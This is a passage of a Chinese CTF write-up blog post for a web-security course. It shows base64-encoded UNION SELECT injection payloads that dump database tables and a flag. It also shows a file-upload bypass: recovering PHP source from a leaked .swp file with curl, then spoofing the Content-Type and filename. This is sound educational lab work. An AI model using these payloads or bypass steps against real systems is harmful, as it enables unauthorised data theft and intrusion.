+<p><code>http://39.102.144.60:30007/?id=MSBVTklPTiBTRUxFQ1QgMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYT0nd2Vic2VjJw==</code></p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120172412328.png" alt="image-20251120172412328"></p>
+<p><strong>获取flag表的列名</strong>。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;websec&#x27;</span> <span class="keyword">AND</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://39.102.144.60:30007/?id=MSBVTklPTiBTRUxFQ1QgMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfc2NoZW1hPSd3ZWJzZWMnIEFORCB0YWJsZV9uYW1lPSdmbGFnJw==</code></p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120172919417.png" alt="image-20251120172919417"></p>
+<p><strong>获取flag的value</strong>。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">value</span> <span class="keyword">FROM</span> websec.flag</span><br></pre></td></tr></table></figure>
+
+<p><code>http://39.102.144.60:30007/?id=MSBVTklPTiBTRUxFQ1QgMSx2YWx1ZSBGUk9NIHdlYnNlYy5mbGFn</code></p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120173136199.png" alt="image-20251120173136199"></p>
+<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><strong>文件上传</strong></p>
+<p>传文件的页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload and get flag?<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;checkFileSizeAndType(1*1024*1024,[&#x27;gif&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;],&#x27;file&#x27;);&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//参数说明</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//maxSize 代表允许最大上传的文件大小，单位是字节</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//allowType 代表允许上传的文件类型（后缀）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//fileId 代表input type=file 框 的id</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkFileSizeAndType</span>(<span class="params">maxSize,allowType,fileId</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//默认大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(!maxSize)&#123;</span></span><br><span class="line"><span class="language-javascript">            maxSize=<span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//默认类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(!allowType)&#123;</span></span><br><span class="line"><span class="language-javascript">            allowType=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//js通过id获取上传的文件对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(fileId);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> types =allowType;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> fileInfo = file.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(!fileInfo)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择文件！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> fileName = fileInfo.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取文件后缀名</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file_typename = fileName.<span class="title function_">substring</span>(</span></span><br><span class="line"><span class="language-javascript">            fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>, fileName.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//定义标志是否可以提交上传</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> isUpload = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//定义一个错误参数：1代表大小超出 2代表类型不支持</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> errNum =<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (fileInfo) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (fileInfo.<span class="property">size</span> &gt; maxSize) &#123;</span></span><br><span class="line"><span class="language-javascript">                isUpload = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                errNum=<span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> types) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (types[i] == file_typename) &#123;</span></span><br><span class="line"><span class="language-javascript">                        isUpload = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">return</span> isUpload;</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        isUpload = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                        errNum=<span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//对错误的类型进行对应的提示</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (!isUpload) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(errNum==<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> size = maxSize/<span class="number">1024</span>/<span class="number">1024</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;上传的文件必须为小于&quot;</span>+size+<span class="string">&quot;M的图片！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(errNum==<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;上传的&quot;</span>+file_typename+<span class="string">&quot;文件类型不支持！只支持&quot;</span>+types.<span class="title function_">toString</span>()+<span class="string">&quot;格式&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;没有选择文件&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            file.<span class="property">value</span>=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> isUpload;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对文件类型和大小有限制。试着传了一个小图片上去。跳到了<a target="_blank" rel="noopener" href="http://39.102.144.60:30008/index.php">http://39.102.144.60:30008/index.php</a></p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120214347600.png" alt="image-20251120214347600"></p>
+<p>没有头绪了。得知了有个<code>.index.php.swp</code>的存在（可以通过dirsearch扫描页面结构）（编辑文件的时候突然断电会产生swp文件）。访问这个url可以下载swp文件，本来应该用<code>vim -r</code>查看但我懒了，用strings（windows不带strings怎么办？用git bash运行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://39.102.144.60:30008/.index.php.swp | strings | sed -n &#x27;1,300p&#x27; &gt; swp.txt</span><br></pre></td></tr></table></figure>
+
+<p>主要逻辑大概是这段（因为没用vim吗感觉乱得可以）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;</span></span><br><span class="line"><span class="string">&lt;/h1&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$filename</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">copy</span>(<span class="string">&#x27;../flag&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$filetype</span>) === <span class="string">&quot;.php&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="variable">$filetype</span>;</span><br><span class="line">            <span class="variable">$filetype</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="number">1</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;error file head!&quot;</span>);</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">13780</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">255216</span>:</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type_code</span>) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$type_code</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;chars2&#x27;</span>]);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C2chars&#x27;</span>, <span class="variable">$bin</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file_tmp</span>);</span><br><span class="line">        <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file_tmp</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$file_tmp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;size too big!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span> &gt; <span class="number">2048</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;stop hacking!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] !== <span class="string">&quot;image/jpeg&quot;</span>)&#123;</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fil233333</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br></pre></td></tr></table></figure>
+
+<p>服务端通过读 <code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code> 的前两个字节判断文件类型（<code>$type_code</code>），对 <code>255216</code>（JPEG）和 <code>13780</code>（PNG）等设置 <code>$flag = 1</code>；否则 <code>$flag = 0</code>（不是合法图片）。</p>
+<p>服务器把上传的原始文件名的后缀取出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filetype</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>如果上传的文件是 <code>.php</code>（<code>strtolower($filetype) === &quot;.php&quot;</code>），代码会把目标保存名设为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="variable">$filetype</span>;</span><br></pre></td></tr></table></figure>
+
+<p>也就是：<code>md5(原始文件名) + &quot;.php&quot;</code>（注意：没有路径前缀，所以文件会写到当前目录，也就是 webroot）。</p>
+<p>最关键的逻辑分支：当 <code>$flag === 1</code> 时会 <code>move_uploaded_file(..., $filename)</code>（把你上传的文件写入）；当 <code>$flag !== 1</code>（即服务器判断它不是允许的图片）时，会执行<code>copy(&#39;../flag&#39;, $filename);</code>,把上一级目录的 <code>flag</code> 文件内容复制到 <code>$filename</code>（即 webroot 下的 <code>md5(原始名).php</code>）。<br>也就是说：<strong>上传一个名字以 <code>.php</code> 结尾且文件头表明不是JPEG或PNG的文件（并且通过前端的文件类型检查），服务器会把flag 文件复制成一个<code>md5(你的文件名).php</code> 文件。</strong></p>
+<p>所以可以上传一个小图片（通过文件大小等的检查），文件名设置成flag.php，在请求中把文件类型写成png</p>
+<p>传一个小图片，用burpsuite截获，保证filename以.php结尾，和Content-Type是那两个图片类型之一</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120224446037.png" alt="image-20251120224446037"></p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120224746187.png" alt="image-20251120224746187"></p>
+<p>还是stop hacking是为啥呢。后来看了眼别人的php代码，原来是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] !== <span class="string">&quot;image/jpeg&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;stop hacking!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span> &gt; <span class="number">2048</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;size too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_tmp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file_tmp</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file_tmp</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C2chars&#x27;</span>, <span class="variable">$bin</span>);</span><br><span class="line">        <span class="variable">$type_code</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;chars2&#x27;</span>]);</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type_code</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">255216</span>:</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">13780</span>:</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;error file head!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$filetype</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="variable">$filetype</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$filetype</span>) === <span class="string">&quot;.php&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">copy</span>(<span class="string">&#x27;../flag&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;成功&lt;/h1&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以得是jpeg才行。把文件类型改一下</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120230306739.png" alt="image-20251120230306739"></p>
+<p>返回：</p>
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120230323985.png" alt="image-20251120230323985"></p>
+<p>文件名是<code>flag.php</code>，md5加密一下得到存放flag的文件名<code>71C31CCA71459CAFDB161A3F63A6FDC7.php</code></p>
+<p>大写不行得用小写，我服了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://39.102.144.60:30008/71c31cca71459cafdb161a3f63a6fdc7.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/20/CTF/Web/web_security_final/image-20251120230841505.png" alt="image-20251120230841505"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/UCAS/" rel="tag"># UCAS</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/17/Notes/some_notes_I_always_forget/" rel="prev" title="存一下那些我总是翻的笔记">
+                  <i class="fa fa-angle-left"></i> 存一下那些我总是翻的笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/21/Notes/little_notes/" rel="next" title="little notes">
+                  little notes <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mintind</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
